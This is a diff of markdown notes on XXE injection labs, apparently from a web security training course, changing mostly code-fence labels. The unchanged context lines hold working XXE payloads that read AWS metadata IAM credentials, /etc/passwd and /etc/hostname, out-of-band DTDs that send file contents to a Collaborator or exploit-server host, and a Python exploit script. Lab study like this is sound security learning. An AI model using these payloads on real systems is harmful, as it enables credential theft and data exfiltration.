@@ -46,7 +46,7 @@ http://169.254.169.254/latest/meta-data/iam
 http://169.254.169.254/latest/meta-data/iam/security-credentials
 http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
 
-```
+```shell
 ?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY nbyte SYSTEM "http://169.254.169.254/"> ]>
 <stockCheck>
@@ -59,7 +59,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
 </stockCheck>
 ```
 
-```
+```shell
 ?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY paein SYSTEM "http://169.254.169.254/latest.../.../admin"> ]>
 <stockCheck>
@@ -75,7 +75,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
 ![[Pasted image 20240926201314.png]]
 
 - Python script
-```
+```python
 import requests
 import sys
 import urllib3
@@ -85,7 +85,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_xxe(s, url):
-
     print("(+) Exploiting XXE Injection...")
     stock_url = url + "/product/stock"
     data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
@@ -125,7 +124,7 @@ Analysis:
 ![[Pasted image 20240927012657.png]]
 
 - we observe that we are in a blind XXE injection case (out of band) so we will use an external server in order to obtain a DNS lookup (we have to use burp collaborator)
-```
+```shell
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [<!ENTITY nbyte SYSTEM "http://Burp-Collaborator-SubDomain">]>
 <stockCheck>
@@ -156,7 +155,7 @@ Analysis:
 ![[Pasted image 20240927014716.png]]
 
 - we will declare and reference our entity inside of the doctype 
-```
+```shell
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [<!ENTITY % nbyte SYSTEM "http://Burp-Collaborator-SubDomain"> %nbyte; ]>
 <stockCheck>
@@ -190,7 +189,7 @@ To solve the lab, exfiltrate the contents of the `/etc/hostname` file.
 
 Analysis:
 
-- first we will try an out of band exfiltration using burp collaborator/our exploit server
+- first we will try an out of band exfiltration using burp collaborator
 
     `<!DOCTYPE test [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL(server/exploit)"> %xxe;]>`
 
@@ -203,7 +202,7 @@ Note:
 	In this case we have to retrieve a single line file (/etc/hostname) so we can manage this via building the DTD pointing to the exploit server .
 
 - DTD exploit file (for /etc/hostname)
-```
+```shell
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a36000204174338c4c637de0106008f.exploit-server.net/?X=%file;'>">
 %stack;
@@ -243,7 +242,7 @@ Analysis:
 %stack; 
 %error;
 ```
-	![[Pasted image 20240927231719.png]]
+![[Pasted image 20240927231719.png]]
 	![[Pasted image 20240927232654.png]]
 
 
@@ -276,7 +275,7 @@ Analysis:
  <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
 ```
-	![[Pasted image 20240929091746.png]]
+![[Pasted image 20240929091746.png]]
 
 ## **8. Exploiting XXE via image file upload**
 This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. 
@@ -344,7 +343,7 @@ Analysis:
 - Payload:
 	  ![[Pasted image 20240930194309.png]]
 
-```markup
+```shell
 <!DOCTYPE message [
     <!ENTITY % nbyte SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
 
